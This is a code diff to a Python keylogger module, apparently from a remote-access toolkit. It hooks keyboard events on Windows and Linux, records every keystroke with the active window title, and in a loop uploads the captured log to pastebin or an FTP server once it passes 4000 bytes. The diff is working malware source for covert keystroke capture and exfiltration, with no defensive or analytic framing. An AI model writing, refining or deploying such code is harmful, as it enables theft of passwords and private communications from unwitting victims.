@@ -20,27 +20,31 @@ import collections
 
 import util
 
-__Keylogger_imports = ['pyHook','pythoncom','pyxhook']
-_window             = None
-_size               = 4000
-_buffer             = cStringIO.StringIO()
-results             = Queue.Queue()
+# globals
 
+packages  = ['pyHook','pythoncom'] if os.name == 'nt' else ['pyxhook']
+platforms = ['win32','linux2','darwin']
+window    = None
+max_size  = 4000
+log       = cStringIO.StringIO()
+results   = Queue.Queue()
+util.is_compatible(platforms, __name__)
+util.imports(packages)
 
 def _event(event):
     try:
-        if event.WindowName != vars(Keylogger)['window']:
-            vars(Keylogger)['window'] = event.WindowName
-            _buffer.write("\n[{}]\n".format(_window))
+        if event.WindowName != globals()['window']:
+            globals()['window'] = event.WindowName
+            globals()['log'].write("\n[{}]\n".format(window))
         if event.Ascii > 32 and event.Ascii < 127:
-            _buffer.write(chr(event.Ascii))
+            globals()['log'].write(chr(event.Ascii))
         elif event.Ascii == 32:
-            _buffer.write(' ')
+            globals()['log'].write(' ')
         elif event.Ascii in (10,13):
-            _buffer.write('\n')
+            globals()['log'].write('\n')
         elif event.Ascii == 8:
-            _buffer.seek(-1, 1)
-            _buffer.truncate()
+            globals()['log'].seek(-1, 1)
+            globals()['log'].truncate()
         else:
             pass
     except Exception as e:
@@ -56,11 +60,11 @@ def auto(mode):
         return "Error: invalid mode '{}'".format(str(mode))
     while True:
         try:
-            if _buffer.tell() > max_size:
-                result  = util.pastebin(_buffer) if mode == 'pastebin' else _upload_ftp(_buffer, filetype='.txt')
+            if globals()['log'].tell() > globals()['max_size']:
+                result  = util.pastebin(globals()['log']) if mode == 'pastebin' else util.ftp(globals()['log'], filetype='.txt')
                 results.put(result)
-                _buffer.reset()
-            elif globals().get('_abort'):
+                globals()['log'].reset()
+            elif globals()['_abort']:
                 break
             else:
                 time.sleep(5)
